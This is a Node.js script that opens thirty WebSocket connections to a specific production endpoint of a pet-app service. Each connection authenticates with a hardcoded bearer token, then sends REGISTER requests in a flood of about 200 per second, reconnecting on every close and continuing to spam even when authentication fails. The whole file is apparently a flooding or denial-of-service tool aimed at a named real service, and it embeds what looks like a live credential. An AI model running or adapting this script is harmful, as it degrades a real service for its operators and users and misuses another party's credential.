import WebSocket from "ws";
import { v4 as uuidv4 } from "uuid";

const endpoint = "wss://petbot-monorepo-websocket-333713154917.europe-west1.run.app/";
const jwt = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWY3aGRvNzcwMDA5bGQwY2FhMXE0cXQxIiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTcxMTU4MDAsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21mN2hkbzlhMDAwYmxkMGMzenNuNWI2NyIsImV4cCI6MTc1NzExOTQwMH0.Q0SaqnpAx2Uwg1Mie112YnG0Deg0XUrolhaLtxysQc69ltCArtbJIf8lnZD9qdUVAf0_AauoaKSqRmQrAwksjw";
const origin = "https://app.pett.ai";

const pettName = "soeprr_ir_ew";

const NUM_CONNECTIONS = 30;
const messagesPerSecondPerSocket = 100;

let totalRequestsSent = 0;

function startSpamLoop(ws, id) {
  return setInterval(() => {
    const now = new Date();
    const time = now.toLocaleTimeString();

    for (let i = 0; i < messagesPerSecondPerSocket; i++) {
      const message = {
        type: "REGISTER",
        data: {
          params: {
            authType: "privy",
            registerHash: {
              hash: jwt,
              name: pettName
            }
          }
        },
        nonce: uuidv4()
      };

      ws.send(JSON.stringify(message));
      totalRequestsSent++;
    }

    console.log(
      `Socket #${id} sent ${messagesPerSecondPerSocket} messages at ${time}`
    );
    console.log(`Total sent so far: ${totalRequestsSent}`);
  }, 500);
}

function connect(id) {
  const ws = new WebSocket(endpoint, { headers: { Origin: origin } });

  let spamInterval;

  ws.on("open", () => {
    console.log(`✅ Socket #${id} connected`);

    const authMessage = {
      type: "AUTH",
      data: {
        params: {
          authType: "privy",
          authHash: { hash: jwt }
        }
      },
      nonce: uuidv4()
    };

    ws.send(JSON.stringify(authMessage));
  });

  ws.on("message", (data) => {
    const msg = JSON.parse(data.toString());
    console.log(`📨 Socket #${id} received:`, msg);

    if (msg.type === "auth_result") {
      if (msg.success) {
        console.log(`🔑 Socket #${id} authenticated, starting spam loop...`);
        spamInterval = startSpamLoop(ws, id);
      } else {
        console.error(`❌ Socket #${id} auth failed:`, msg.error);
        spamInterval = startSpamLoop(ws, id);
      }
    }
  });

  ws.on("close", () => {
    console.log(`🔒 Socket #${id} closed, retrying in 3s...`);
    clearInterval(spamInterval);
    setTimeout(() => connect(id), 3000);
  });

  ws.on("error", (err) => {
    console.error(`❌ Socket #${id} error:`, err.message);
  });
}

for (let i = 1; i <= NUM_CONNECTIONS; i++) {
  connect(i);
}
